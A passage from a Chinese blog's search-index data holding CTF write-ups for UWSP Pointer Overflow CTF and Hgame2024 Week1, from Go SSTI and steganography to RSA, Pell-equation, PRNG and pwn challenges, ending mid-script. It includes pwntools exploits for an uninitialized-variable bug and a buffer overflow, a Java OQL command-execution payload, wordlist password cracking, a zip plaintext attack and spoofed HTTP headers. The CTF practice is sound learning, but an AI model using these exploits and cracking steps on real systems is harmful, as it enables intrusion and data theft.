由于题目中进行了html转义，所以单引号和双引号都不能用，所以用Query方法可以获取我们在url传的其他参数 但是&#123;&#123;.Query 1&#125;&#125;中的1会解析为int类型导致出错，&#123;&#123;.Query a&#125;&#125;会解析为函数a也会出错，所以用print将1转换为string类型，传给Query，这样就成功绕过了对tmpl的检查。 总结go ssti主要还是要去看模版解析的基类型，即&#123;&#123;.&#125;&#125;被解析为什么，然后去看这个对象有什么可以利用的方法或者属性，从而实现绕过。","tags":["ctf","2024","ssti","web","go"],"categories":["Web"]},{"title":"UWSP Pointer Overflow CTF-Writeup","path":"/2024/02/05/UWSP Pointer Overflow CTF/","content":"UWSP Pointer Overflow CTF目录 Misc Sight Without Vision Here You See A Passer By Steg Absence Makes Hearts Go Yonder An Invincible Summer Between Secrets and Lies* Web We Rest Upon a Single Hope Vigil of the Ceaseless Eyes Quantity is Not Abundance Crypto Unquestioned and Unrestrained A Pale, Violet Light Missing and Missed Crack We Mighty, We Meek* The Gentle Rocking of the Sun With Desperation and Need* Reverse Easy as it Gets A Tangled Web We Weave Sunshine on Filth is Not Polluted Forensics If You Don’t, Remember Me A Petty Wage in Regret Better to Burn in the Light Exploit My Friend, A Loathsome Worm MiscSight Without VisionHere You See A Passer By 走迷宫 1poctf&#123;uwsp_pr377y_bu7_p377y_bu7_pr377y&#125; StegAbsence Makes Hearts Go Yonder给了gif flag在文件末尾 1poctf&#123;uwsp_h342d_y0u_7h3_f1257_71m3&#125; An Invincible Summer 给了很多图片，每个图片都有两种格式，双图隐写考虑合并 随便取两张图，在sub下看到了相对奇怪的红点 保存提取，发现明文 于是写脚本来提取 12345678910111213141516171819202122232425262728293031323334353637383940import osfrom PIL import Imagefile_list=[&#x27;CD.bmp&#x27;, &#x27;CD.jpg&#x27;, &#x27;bat.bmp&#x27;, &#x27;bat.png&#x27;, &#x27;casette.bmp&#x27;, &#x27;casette.jpg&#x27;, &#x27;hand.bmp&#x27;, &#x27;hand.jpg&#x27;, &#x27;key.bmp&#x27;, &#x27;key.jpg&#x27;, &#x27;lock.bmp&#x27;, &#x27;lock.png&#x27;, &#x27;mittens.bmp&#x27;, &#x27;mittens.jpg&#x27;, &#x27;rug.bmp&#x27;, &#x27;rug.jpg&#x27;, &#x27;tapochki.bmp&#x27;, &#x27;tapochki.jpg&#x27;, &#x27;vhs.bmp&#x27;, &#x27;vhs.jpg&#x27;, &#x27;walkman.bmp&#x27;, &#x27;walkman.jpg&#x27;]def bin2bytes(data:str): res=b&#x27;&#x27; for i in range(len(data)//8): res+=int.to_bytes(int(data[i*8:i*8+8],2),1,&#x27;big&#x27;) return resdef image_sub(f1:Image.Image,f2:Image.Image,name): f3=Image.new(&#x27;1&#x27;,(f1.width,f1.height)) ch1=f1.getchannel(&#x27;R&#x27;) ch2=f2.getchannel(&#x27;R&#x27;) for i in range(f1.width): for j in range(f1.height): p1=ch1.getpixel((i,j)) p2=ch2.getpixel((i,j)) pixel=(abs(p1-p2)) f3.putpixel((i,j),pixel) f3.save(f&quot;&#123;name&#125;_sub.png&quot;) f=Image.open(f&quot;&#123;name&#125;_sub.png&quot;) data = &#x27;&#x27; for i in range(f.height): for j in range(f.width): pixel = f.getpixel((j, i)) if pixel == 255: data += &#x27;1&#x27; else: data += &#x27;0&#x27; data=bin2bytes(data) return datafor i in range(len(file_list)//2): f1=Image.open(file_list[i*2]) f2=Image.open(file_list[i*2+1]) data=image_sub(f1,f2,file_list[i*2].split(&#x27;.&#x27;)[0]) print(data.strip(b&#x27;\\x00&#x27;).decode(errors=&#x27;ignore&#x27;))#poctf&#123;uwsp_1_h4v3_n0_m0u7h_4nd_1_mu57_5cr34m&#125; Between Secrets and Lies* WebWe Rest Upon a Single Hope前端题 跑一下就出来了 1poctf&#123;uwsp_1_4m_4ll_7h47_7h3r3_15_0f_7h3_m057_r34l&#125; Vigil of the Ceaseless Eyes 一个论坛 直接访问即可 1poctf&#123;uwsp_71m3_15_4n_1llu510n&#125; Quantity is Not Abundance https://blog.csdn.net/qq_55316925/article/details/128571809https://blog.csdn.net/qq_55316925/article/details/128571809 加上Referer即可 1Referer: https://nvstgt.com/Quantity/index.html? 12poctf&#123;uwsp_1_h4v3_70_1n5157&#125; CryptoUnquestioned and Unrestrainedbase64 1poctf&#123;uwsp_411_y0u2_8453_423_8310n9_70_u5&#125; A Pale, Violet Light12345e= 5039N = 34034827C = 933969 15848125 24252056 5387227 5511551 10881790 3267174 14500698 28242580 933969 32093017 18035208 2594090 2594090 9122397 21290815 15930721 4502231 5173234 21290815 23241728 2594090 21290815 18035208 10891227 15930721 202434 202434 21290815 5511551 202434 4502231 5173234 25243036 RSA 12345678910111213from Crypto.Util.number import long_to_bytes,inversee= 5039N = 34034827p=5807q=5861C = [933969,15848125,24252056,5387227,5511551,10881790,3267174,14500698,28242580,933969,32093017,18035208,2594090,2594090,9122397,21290815,15930721,4502231,5173234,21290815,23241728,2594090,21290815,18035208,10891227,15930721,202434,202434,21290815,5511551,202434,4502231,5173234,25243036]phi=(p-1)*(q-1)d=inverse(e,phi)flag=b&#x27;&#x27;for i in C: flag+=long_to_bytes(pow(i,d,N))print(flag)#poctf&#123;uwsp_533k_4nd_y3_5h411_f1nd&#125; Missing and Missedbrainfuck 123++++++++++[&gt;+&gt;+++&gt;+++++++&gt;++++++++++&lt;&lt;&lt;&lt;-]&gt;&gt;&gt;&gt;++++++++++++.-.------------.+++++++++++++++++.--------------.+++++++++++++++++++++.------.++.----.---.-----------------.&lt;&lt;++++++++++++++++++++.-.++++++++.&gt;&gt;+++++++++.&lt;&lt;--.&gt;&gt;---------.++++++++++++++++++++++++.&lt;&lt;-----.--.&gt;&gt;---------.&lt;&lt;+++++++++.&gt;&gt;---------------.&lt;&lt;---------.++.&gt;&gt;.+++++++.&lt;&lt;--.++.+++++++.---------.+++++++..----.&gt;&gt;++++++++.+++++++++++++++.poctf&#123;uwsp_219h7_w20n9_02_f0290773n&#125; CrackWe Mighty, We Meek* excel密码爆破 12office2john crack1.xls &gt; hash.txtjohn --wordlist=/usr/share/wordlists/rockyou.txt hash.txt The Gentle Rocking of the Sun https://crackstation.net/https://crackstation.net/ 1zwischen 解压出来还是个嵌套的文件夹 123456789101112131415import osdir= &#x27;2023&#x27;flag=&#x27;&#x27;while True: lst=os.listdir(dir) if &#x27;.DS_Store&#x27; in lst: lst.remove(&#x27;.DS_Store&#x27;) if lst: dir= dir + &#x27;/&#x27; + lst[0] flag+=lst[0] else: breakprint(flag)#poctf&#123;uwsp_c411f02n14_d234m1n9&#125; With Desperation and Need* veracrypt加密卷爆破密码 ReverseEasy as it Gets1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465[Reflection.Assembly]::LoadWithPartialName(&quot;System.Security&quot;) function Encrypt-String($String, $Passphrase, $salt=&quot;SaltCrypto&quot;, $init=&quot;IV_Password&quot;, [switch]$arrayOutput) &#123; $r = new-Object System.Security.Cryptography.RijndaelManaged $pass = [Text.Encoding]::UTF8.GetBytes($Passphrase) $salt = [Text.Encoding]::UTF8.GetBytes($salt) $r.Key = (new-Object Security.Cryptography.PasswordDeriveBytes $pass, $salt, &quot;SHA1&quot;, 5).GetBytes(32) #256/8 $r.IV = (new-Object Security.Cryptography.SHA1Managed).ComputeHash( [Text.Encoding]::UTF8.GetBytes($init) )[0..15] $c = $r.CreateEncryptor() $ms = new-Object IO.MemoryStream $cs = new-Object Security.Cryptography.CryptoStream $ms,$c,&quot;Write&quot; $sw = new-Object IO.StreamWriter $cs $sw.Write($String) $sw.Close() $cs.Close() $ms.Close() $r.Clear() [byte[]]$result = $ms.ToArray() return [Convert]::ToBase64String($result) &#125; function Decrypt-String($Encrypted, $Passphrase, $salt=&quot;SaltCrypto&quot;, $init=&quot;IV_Password&quot;) &#123; if($Encrypted -is [string])&#123; $Encrypted = [Convert]::FromBase64String($Encrypted) &#125; $r = new-Object System.Security.Cryptography.RijndaelManaged $pass = [Text.Encoding]::UTF8.GetBytes($Passphrase) $salt = [Text.Encoding]::UTF8.GetBytes($salt) $r.Key = (new-Object Security.Cryptography.PasswordDeriveBytes $pass, $salt, &quot;SHA1&quot;, 5).GetBytes(32) #256/8 $r.IV = (new-Object Security.Cryptography.SHA1Managed).ComputeHash( [Text.Encoding]::UTF8.GetBytes($init) )[0..15] $d = $r.CreateDecryptor() $ms = new-Object IO.MemoryStream @(,$Encrypted) $cs = new-Object Security.Cryptography.CryptoStream $ms,$d,&quot;Read&quot; $sr = new-Object IO.StreamReader $cs Write-Output $sr.ReadToEnd() $sr.Close() $cs.Close() $ms.Close() $r.Clear() &#125; cls #### # TODO: use strong password # Canadian_Soap_Opera ### $pwd = read-host &quot;(Case Sensitive) Please Enter User Password&quot; $pcrypted = &quot;TTpgx3Ve2kkHaFNfixbAJfwLqTGQdk9dkmWJ6/t0UCBH2pGyJP/XDrXpFlejfw9d&quot; write-host &quot;Encrypted Password is: $pcrypted&quot; write-host &quot;&quot; write-host &quot;Testing Decryption of Username / Password...&quot; write-host &quot;&quot; $pdecrypted = Decrypt-String $pcrypted $pwd write-host &quot;Decrypted Password is: $pdecrypted&quot; 1poctf&#123;uwsp_4d_v1c70r14m_w4573l4nd3r&#125; A Tangled Web We Weave12345678910111213141516171819202122232425262728293031323334353637section .data encoded_message db 0x0F, 0x10, 0x1C, 0x0B, 0x19, 0x04, 0x0A, 0x08, 0x0C, 0x0F, 0x20, 0x14, 0x4E, 0x11, 0x46, 0x20, 0x14, 0x4F, 0x11, 0x46, 0x20, 0x46, 0x4F, 0x48, 0x20, 0x11, 0x4F, 0x48, 0x17, 0x4E, 0x11, 0x46, 0x20, 0x4F, 0x11, 0x20, 0x12, 0x4C, 0x02section .text global _start_start: mov ecx, 0 mov edi, encoded_message find_length: cmp byte [edi], 0 je print_message inc ecx inc edi jmp find_length print_message: xor esi, esi mov edi, encoded_message decode: xor eax, eax mov al, byte [edi + esi] xor al, ; something missing? mov byte [edi + esi], al inc esi cmp byte [edi + esi], 0 jne decode mov edx, ecx mov eax, 4 mov ebx, 1 mov ecx, encoded_message int 0x80 mov eax, 1 xor ebx, ebx int 0x80 一眼异或加密 1poctf&#123;uwsp_k1n9_k0n9_907_n07h1n9_0n_m3&#125; Sunshine on Filth is Not Polluted hint为 1Uninitialized variables 在login里面可以得到shell authcode是随机生成的 这里的confire username的username是没有初始化的，而且调试发现恰好此时local_18就是之前残留的auth_code的值 所以exp如下 123456789101112from pwn import *p=remote(&#x27;34.123.210.162&#x27;,&#x27;20231&#x27;)p.sendlineafter(b&#x27;(3) Done: &#x27;,b&#x27;2&#x27;)data=p.recvline().strip()[-2:]auth_code=int.from_bytes(data,&#x27;little&#x27;)p.sendlineafter(b&#x27;(3) Done: &#x27;,b&#x27;1&#x27;)p.sendlineafter(b&#x27;Username: &#x27;,b&#x27;admin&#x27;)p.sendlineafter(b&#x27;(3) Done: &#x27;,b&#x27;3&#x27;)p.sendlineafter(b&#x27;Enter your authentication code: &#x27;,str(auth_code).encode())p.interactive()#poctf&#123;uwsp_7h3_1355_y0u_kn0w_7h3_837732&#125; ForensicsIf You Don’t, Remember Me 1poctf&#123;uwsp_w31c0m3_70_7h3_94m3&#125; A Petty Wage in Regret 给了一张图片 图片锐度明显有问题 第一部分在exif信息的ascii里 1poctf&#123;uwsp_7h3_w0rld_h4d_17_f1257&#125; Better to Burn in the Light 从磁盘文件中恢复文件 Master File Table binwalk可以得到第一个flag 通过exif信息中的CLUE，可以找到第二张图 1poctf&#123;uwsp_5h1v3r_m3_71mb3r5&#125; Exploit随便做了一道后面没做了 My Friend, A Loathsome Worm 在输入username的地方溢出，将loacl_1c的位置覆盖为0x539即可 12345678910from pwn import *p=remote(&#x27;34.123.210.162&#x27;,20232)p.sendlineafter(b&#x27;Choice: &#x27;,b&#x27;1&#x27;)p.sendlineafter(b&#x27;Enter new username: &#x27;,b&#x27;a&#x27;*28+b&#x27;\\x39\\x05&#x27;)p.sendlineafter(b&#x27;Choice: &#x27;,b&#x27;3&#x27;)p.interactive()#poctf&#123;uwsp_5w337_c10v32_4nd_50f7_511k&#125;","tags":["ctf","2024","UWSP-CTF"],"categories":["Writeups"]},{"title":"Hgame2024 Week1-Writeup","path":"/2024/02/05/Hgame2024-Week1 Writeup/","content":"Week1目录 Misc 来自星尘的问候 希儿希儿希尔 simple-attack Web Bypass it ezHTTP Select Courses 2048*16 jhat Re ezPYC Crypto ezRSA ezMath ezPRNG 奇怪的图片 Pwn ezshellcode Elden Random Challenge ezfmt string Elden Ring Ⅰ Misc来自星尘的问候 https://my1l.github.io/Ctrl/CtrlAstr.htmlhttps://my1l.github.io/Ctrl/CtrlAstr.html 12hgame&#123;welc0me!&#125; 希儿希儿希尔crc修复 lsb隐写 hill加密 1CVOCRJGMKLDJGBQIUIVXHEYLPNWR 1DISAPPEARINTHESEAOFBUTTERFLY simple-attackzip明文攻击 12./bkcrack -C /Users/zhou39512/CTF/HGAME2024/Week1/Misc/simple_attack/src/attachment.zip -c 103223779_p0.jpg -P /Users/zhou39512/CTF/HGAME2024/Week1/Misc/simple_attack/src/src.zip -p 103223779_p0.jpg https://www.poboke.com/crack-encrypted-zip-file-with-plaintext-attack.htmlhttps://www.poboke.com/crack-encrypted-zip-file-with-plaintext-attack.html 生成新密码为123的zip 1./bkcrack -C /Users/zhou39512/CTF/HGAME2024/Week1/Misc/simple_attack/src/attachment.zip -c 103223779_p0.jpg -k e423add9 375dcd1c 1bce583e -U new_zip_123.zip 123 解压得到 WebBypass it不给注册，直接向register.php发请求就能注册成功 ezHTTP1234X-real-Ip: 127.0.0.1Referer:vidar.clubUser-Agent: Mozilla/5.0 (Vidar; VidarOS x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0 1hgame&#123;HTTP_!s_1mP0rT4nt&#125; Select Courses无大语，有人随机退课，一直选课就行，总能选到 1hgame&#123;w0W_!_1E4Rn_To_u5e_5cripT_^_^&#125; 2048*16js混淆 搜索won定位到关键处 直接所有代码复制 打印t jhatOQL RCE https://www.wenjiangs.com/doc/7tsoxdy9nldrhttps://www.wenjiangs.com/doc/7tsoxdy9nldr https://github.com/adipinto/security-advisories/blob/master/framework/GemFile/20141125_rce_through_reflection/README.mdhttps://github.com/adipinto/security-advisories/blob/master/framework/GemFile/20141125_rce_through_reflection/README.md 12345678a=java.lang.Runtime.getRuntime().exec(&#x27;cat /flag&#x27;).getInputStream();b=new java.io.InputStreamReader(a);c=new java.io.BufferedReader(b);while(c.ready())&#123;d+=c.readLine()+&#x27; &#x27;;&#125; ReezPYCpycdas反编译 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138[Code] File Name: ezPYC.py Object Name: &lt;module&gt; Qualified Name: &lt;module&gt; Arg Count: 0 Pos Only Arg Count: 0 KW Only Arg Count: 0 Stack Size: 5 Flags: 0x00000000 [Names] &#x27;flag&#x27; &#x27;c&#x27; &#x27;input&#x27; &#x27;range&#x27; &#x27;i&#x27; &#x27;ord&#x27; &#x27;print&#x27; &#x27;exit&#x27; [Locals+Names] [Constants] ( 87 75 71 69 83 121 83 125 117 106 108 106 94 80 48 114 100 112 112 55 94 51 112 91 48 108 119 97 115 49 112 112 48 108 100 37 124 2 ) ( 1 2 3 4 ) &#x27;plz input flag:&#x27; 0 36 1 4 &#x27;Sry, try again...&#x27; &#x27;Wow!You know a little of python reverse&#x27; None [Disassembly] 0 RESUME 0 2 BUILD_LIST 0 4 LOAD_CONST 0: (87, 75, 71, 69, 83, 121, 83, 125, 117, 106, 108, 106, 94, 80, 48, 114, 100, 112, 112, 55, 94, 51, 112, 91, 48, 108, 119, 97, 115, 49, 112, 112, 48, 108, 100, 37, 124, 2) 6 LIST_EXTEND 1 8 STORE_NAME 0: flag 10 BUILD_LIST 0 12 LOAD_CONST 1: (1, 2, 3, 4) 14 LIST_EXTEND 1 16 STORE_NAME 1: c 18 PUSH_NULL 20 LOAD_NAME 2: input 22 LOAD_CONST 2: &#x27;plz input flag:&#x27; 24 PRECALL 1 28 CALL 1 38 STORE_NAME 2: input 40 PUSH_NULL 42 LOAD_NAME 3: range 44 LOAD_CONST 3: 0 46 LOAD_CONST 4: 36 48 LOAD_CONST 5: 1 50 PRECALL 3 54 CALL 3 64 GET_ITER 66 FOR_ITER 62 (to 192) 68 STORE_NAME 4: i 70 PUSH_NULL 72 LOAD_NAME 5: ord 74 LOAD_NAME 2: input 76 LOAD_NAME 4: i 78 BINARY_SUBSCR 88 PRECALL 1 92 CALL 1 102 LOAD_NAME 1: c 104 LOAD_NAME 4: i 106 LOAD_CONST 6: 4 108 BINARY_OP 6 (%) 112 BINARY_SUBSCR 122 BINARY_OP 12 (^) 126 LOAD_NAME 0: flag 128 LOAD_NAME 4: i 130 BINARY_SUBSCR 140 COMPARE_OP 3 (!=) 146 POP_JUMP_FORWARD_IF_FALSE 21 (to 190) 148 PUSH_NULL 150 LOAD_NAME 6: print 152 LOAD_CONST 7: &#x27;Sry, try again...&#x27; 154 PRECALL 1 158 CALL 1 168 POP_TOP 170 PUSH_NULL 172 LOAD_NAME 7: exit 174 PRECALL 0 178 CALL 0 188 POP_TOP 190 JUMP_BACKWARD 63 192 PUSH_NULL 194 LOAD_NAME 6: print 196 LOAD_CONST 8: &#x27;Wow!You know a little of python reverse&#x27; 198 PRECALL 1 202 CALL 1 212 POP_TOP 214 LOAD_CONST 9: None 216 RETURN_VALUE 187, 75, 71, 69, 83, 121, 83, 125, 117, 106, 108, 106, 94, 80, 48, 114, 100, 112, 112, 55, 94, 51, 112, 91, 48, 108, 119, 97, 115, 49, 112, 112, 48, 108, 100, 37, 124, 2 异或1，2，3，4 1VIDAR&#123;Python_R3vers3_1s_1nter3st1ng!&#125; CryptoezRSA123456789101112131415161718192021from Crypto.Util.number import *from secret import flagm=bytes_to_long(flag)p=getPrime(1024)q=getPrime(1024)n=p*qphi=(p-1)*(q-1)e=0x10001c=pow(m,e,n)leak1=pow(p,q,n)leak2=pow(q,p,n)print(f&#x27;leak1=&#123;leak1&#125;&#x27;)print(f&#x27;leak2=&#123;leak2&#125;&#x27;)print(f&#x27;c=&#123;c&#125;&#x27;)&quot;&quot;&quot;leak1=149127170073611271968182576751290331559018441805725310426095412837589227670757540743929865853650399839102838431507200744724939659463200158012469676979987696419050900842798225665861812331113632892438742724202916416060266581590169063867688299288985734104127632232175657352697898383441323477450658179727728908669leak2=116122992714670915381309916967490436489020001172880644167179915467021794892927977272080596641785569119134259037522388335198043152206150259103485574558816424740204736215551933482583941959994625356581201054534529395781744338631021423703171146456663432955843598548122593308782245220792018716508538497402576709461c=10529481867532520034258056773864074017027019578041866245400647840230251661652999709715919620810933437191661180003295923273655675729588558899592524235622728816065501918076120812236580344991140980991532347991252705288633014913479970610056845543523591324177567061948922552275235486615514913932125436543991642607028689762693617305246716492783116813070355512606971626645594961850567586340389705821314842096465631886812281289843132258131809773797777049358789182212570606252509790830994263132020094153646296793522975632191912463919898988349282284972919932761952603379733234575351624039162440021940592552768579639977713099971&quot;&quot;&quot; $$\\begin{align}p^q\\mod pq&#x3D;leak_1\\\\p^q-kpq&#x3D;leak_1\\\\p(p^{q-1}-kq)&#x3D;leak_1\\\\\\end{align}$$ 经检验leak均为素数，说明leak即为p和q 1hgame&#123;F3rmat_l1tt1e_the0rem_is_th3_bas1s&#125; ezMath1234567891011121314151617from Crypto.Util.number import *from Crypto.Cipher import AESimport random,stringfrom secret import flag,y,xdef pad(x): return x+b&#x27;\\x00&#x27;*(16-len(x)%16)def encrypt(KEY): cipher= AES.new(KEY,AES.MODE_ECB) encrypted =cipher.encrypt(flag) return encryptedD = 114514assert x**2 - D * y**2 == 1 flag=pad(flag)key=pad(long_to_bytes(y))[:16]enc=encrypt(key)print(f&#x27;enc=&#123;enc&#125;&#x27;)#enc=b&quot;\\xce\\xf1\\x94\\x84\\xe9m\\x88\\x04\\xcb\\x9ad\\x9e\\x08b\\xbf\\x8b\\xd3\\r\\xe2\\x81\\x17g\\x9c\\xd7\\x10\\x19\\x1a\\xa6\\xc3\\x9d\\xde\\xe7\\xe0h\\xed/\\x00\\x95tz)1\\\\\\t8:\\xb1,U\\xfe\\xdec\\xf2h\\xab`\\xe5&#x27;\\x93\\xf8\\xde\\xb2\\x9a\\x9a&quot; 连分数解佩尔方程 https://blog.csdn.net/wh2124335/article/details/8871535https://blog.csdn.net/wh2124335/article/details/8871535 https://gist.github.com/samueltardieu/717308https://gist.github.com/samueltardieu/717308 1234567891011121314151617181920212223242526272829303132333435363738394041424344from Crypto.Util.number import long_to_bytesfrom Crypto.Cipher import AESdef pell (D): &quot;&quot;&quot;Return the smallest integer set solving Pell equation x^2-D*y^2=1 where x, D and y are positive integers. If there are no solution (D is a square), return None.&gt;&gt;&gt; pell(3) (2, 1) &quot;&quot;&quot; a0 = int (D**0.5) if a0*a0 == D: return None gp = [0, a0] gq = [1, D-a0**2] a = [a0, int((a0+gp[1])/gq[1])] p = [a[0], a[0]*a[1]+1] q = [1, a[1]] maxdepth = None n = 1 while maxdepth is None or n &lt; maxdepth: if maxdepth is None and a[-1] == 2*a[0]: r = n-1 if r % 2 == 1: return p[r], q[r] maxdepth = 2*r+1 n += 1 gp.append (a[n-1]*gq[n-1]-gp[n-1]) gq.append ((D-gp[n]**2)//gq[n-1]) a.append (int ((a[0]+gp[n])//gq[n])) p.append (a[n]*p[n-1]+p[n-2]) q.append (a[n]*q[n-1]+q[n-2]) return p[2*r+1], q[2*r+1]def pad(x): return x+b&#x27;\\x00&#x27;*(16-len(x)%16)if __name__ == &#x27;__main__&#x27;: x,y=pell(114514) key = pad(long_to_bytes(y))[:16] cipher= AES.new(key,AES.MODE_ECB) enc=b&quot;\\xce\\xf1\\x94\\x84\\xe9m\\x88\\x04\\xcb\\x9ad\\x9e\\x08b\\xbf\\x8b\\xd3\\r\\xe2\\x81\\x17g\\x9c\\xd7\\x10\\x19\\x1a\\xa6\\xc3\\x9d\\xde\\xe7\\xe0h\\xed/\\x00\\x95tz)1\\\\\\t8:\\xb1,U\\xfe\\xdec\\xf2h\\xab`\\xe5&#x27;\\x93\\xf8\\xde\\xb2\\x9a\\x9a&quot; flag=cipher.decrypt(enc) print(flag)#hgame&#123;G0od!_Yo3_k1ow_C0ntinued_Fra3ti0ns!!!!!!!&#125; ezPRNG1234567891011121314151617181920212223242526272829from Crypto.Util.number import *import uuiddef PRNG(R,mask): nextR = (R &lt;&lt; 1) &amp; 0xffffffff i=(R&amp;mask)&amp;0xffffffff nextbit=0 while i!=0: nextbit^=(i%2) i=i//2 nextR^=nextbit return (nextR,nextbit)R=str(uuid.uuid4())flag=&#x27;hgame&#123;&#x27;+R+&#x27;&#125;&#x27;print(flag)R=R.replace(&#x27;-&#x27;,&#x27;&#x27;)Rlist=[int(R[i*8:i*8+8],16) for i in range(4)]mask=0b10001001000010000100010010001001output=[]for i in range(4): R=Rlist[i] out=&#x27;&#x27; for _ in range(1000): (R,nextbit)=PRNG(R,mask) out+=str(nextbit) output.append(out)print(f&#x27;output=&#123;output&#125;&#x27;) 目标是恢复R 一位一位往前推就可以 123爆破位-┐ res-┐ v v ? 1111110110111011110000101011010 0 12345678910111213141516171819202122232425262728293031323334output = [ &#x27;1111110110111011110000101011010001000111111001111110100101000011110111111100010000111110110111100001001000101101011110111100010010100000011111101101110101011010111000000011110000100011101111011011000100101100110100101110001010001101101110000010001000111100101010010110110111101110011011001011111011010101011000011011000111011011111001101010111100101100110001011010010101110011101001100111000011110111000001101110000001111100000100000101111100010110111001110011010000011011110110011000001101011111111010110011010111010101001000010011110110011110110101011110111010011010010110111111010011101000110101111101111000110011111110010110000100100100101101010101110010101001101010101011110111010011101110000100101111010110101111110001111111110010000000001110011100100001011111110100111011000101001101001110010010001100011000001101000111010010000101101111101011000000101000001110001011001010010001000011000000100010010010010111010011111111011100100100100101111111001110000111110110001111001111100101001001100010&#x27;, &#x27;0010000000001010111100001100011101111101111000100100111010101110010110011001011110101100011101010000001100000110000000011000000110101111111011100100110111011010000100011111000111001000101001110010110010001000110010101011110011101000011111101101011000011110001101011111000110111000011000110011100100101100111100000100100101111001011101110001011011111111011010100010111011000010010101110110100000110100000100010101000010111101001000011000000000111010010101010111101101011111011001000101000100011001100101010110110001010010001010110111011011111101011100111001101111111111010011101111010010011110011111110100110011111110110001000111100010111000101111000011011011111101110101110100111000011100001010110111100011001011010011010111000110101100110100011101101011101000111011000100110110001100110101010110010011011110000111110100111101110000100010000111100010111000010000010001111110110100001000110110100100110110010110111010011111101011110000011101010100110101011110000110101110111011010110110000010000110001&#x27;, &#x27;1110110110010001011100111110111110111001111101010011001111100100001000111001101011010100010111110101110101111010111100101100010011001001011101000101011000110111000010000101001000100111010110001010000111110110111000011001100010001101000010001111111100000101111000100101000000001001001001101110000100111001110001001011010111111010111101101101001110111010111110110011001000010001010100010010110110101011100000101111100100110011110001001001111100101111001111011011010111001001111010001100110001100001100000110000011111010100101111000000101011111010000111110000101111100010000010010111010110100101010101001111100101011100011001001011000101010101001101100010110000010001110011110011100111000110101010111010011010000001100001011000011101101000000011111000101111101011110011000011011000100100110111010011001111101100101100011000101001110101111001000010110010111101110110010101101000000101001011000000001110001110000100000001001111100011010011000000011011101111101001111110001011101100000010001001010011000001&#x27;, &#x27;0001101010101010100001001001100010000101010100001010001000100011101100110001001100001001110000110100010101111010110111001101011011101110000011001000100100101000011011101000111001001010011100010001010110111011100100111110111001010010111010100000100111110101110010010110100001000010010001101111001110100010001011101100111011101011101100100101011010101000101001000101110011011111110110011111111100000000011100000010011000110001000110101010001011000010101000110000101001110101010111011010010111011001010011100010101001100110000110101100010000100110101110100001101001011011110011100110011001010110100101010111110110111100000111010001111101110000000000111011011101000011001010010111001110111000100111011110100101000100011011101100011111000101110110110111111001111000000011100011000010000101001011001101110101000010101001000100110010000101001111100101000001011011010011110001101000001101111010100101001100010100000111000011110101010100011011001110001011110111010111011010101101100000110000001010010101111011&#x27;]mask = 0b10001001000010000100010010001001def PRNG(R, mask): nextR = (R &lt;&lt; 1) &amp; 0xffffffff i = (R &amp; mask) &amp; 0xffffffff nextbit = 0 while i != 0: nextbit ^= (i % 2) i = i // 2 nextR ^= nextbit return (nextR, nextbit)for i in output: a = i[:31] res = int(i[31]) uid=&#x27;&#x27; for _ in range(32): if PRNG(int(&#x27;1&#x27; + a, 2), mask)[1] == res: uid=&#x27;1&#x27;+uid a=&#x27;1&#x27;+a else: uid=&#x27;0&#x27;+uid a=&#x27;0&#x27;+a res=int(a[-1]) a=a[:-1] print(hex(int(uid,2))[2:],end=&#x27; &#x27;) 奇怪的图片1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071import timefrom PIL import Image, ImageDraw, ImageFontimport threadingimport randomimport secretsflag = &quot;hgame&#123;fake_flag&#125;&quot;def generate_random_image(width, height): image = Image.new(&quot;RGB&quot;, (width, height), &quot;white&quot;) pixels = image.load() for x in range(width): for y in range(height): red = random.randint(0, 255) green = random.randint(0, 255) blue = random.randint(0, 255) pixels[x, y] = (red, green, blue) return imagedef draw_text(image, width, height, token): font_size = random.randint(16, 40) font = ImageFont.truetype(&quot;arial.ttf&quot;, font_size) text_color = (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255)) x = random.randint(0, width - font_size * len(token)) y = random.randint(0, height - font_size) draw = ImageDraw.Draw(image) draw.text((x, y), token, font=font, fill=text_color) return imagedef xor_images(image1, image2): if image1.size != image2.size: raise ValueError(&quot;Images must have the same dimensions.&quot;) xor_image = Image.new(&quot;RGB&quot;, image1.size) pixels1 = image1.load() pixels2 = image2.load() xor_pixels = xor_image.load() for x in range(image1.size[0]): for y in range(image1.size[1]): r1, g1, b1 = pixels1[x, y] r2, g2, b2 = pixels2[x, y] xor_pixels[x, y] = (r1 ^ r2, g1 ^ g2, b1 ^ b2) return xor_imagedef generate_unique_strings(n, length): unique_strings = set() while len(unique_strings) &lt; n: random_string = secrets.token_hex(length // 2) unique_strings.add(random_string) return list(unique_strings)random_strings = generate_unique_strings(len(flag), 8)current_image = generate_random_image(120, 80)key_image = generate_random_image(120, 80)def random_time(image, name): time.sleep(random.random()) image.save(&quot;.\\\\png_out\\\\&#123;&#125;.png&quot;.format(name))for i in range(len(flag)): current_image = draw_text(current_image, 120, 80, flag[i]) threading.Thread(target=random_time, args=(xor_images(current_image, key_image), random_strings[i])).start() 相当于把flag一个个写在图片中，然后和一个key进行异或 取任意一张图片（不考虑第一张和最后一张）和其他图片异或，一定会出现两张图片仅有一个字符 这两个字符一定分别是前一个字符和后一个字符 所以，排列异或之后慢慢看就行 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647import copyimport osimport pytesseractfrom PIL import Image, ImageDraw, ImageFontdef xor_images(image1, image2): if image1.size != image2.size: raise ValueError(&quot;Images must have the same dimensions.&quot;) xor_image = Image.new(&quot;RGB&quot;, image1.size) pixels1 = image1.load() pixels2 = image2.load() xor_pixels = xor_image.load() for x in range(image1.size[0]): for y in range(image1.size[1]): r1, g1, b1 = pixels1[x, y] r2, g2, b2 = pixels2[x, y] xor_pixels[x, y] = (r1 ^ r2, g1 ^ g2, b1 ^ b2) return xor_imagedef count_black_pixels(image1): count=0 pixels1 = image1.load() for x in range(image1.size[0]): for y in range(image1.size[1]): if pixels1[x, y]==(0,0,0): count+=1 return countfiles=os.listdir(&#x27;png_out&#x27;)print(files)for j in files: a=Image.open(f&#x27;png_out/&#123;j&#125;&#x27;,&#x27;r&#x27;) images_dict = &#123;&#125; for ind,i in enumerate(files): 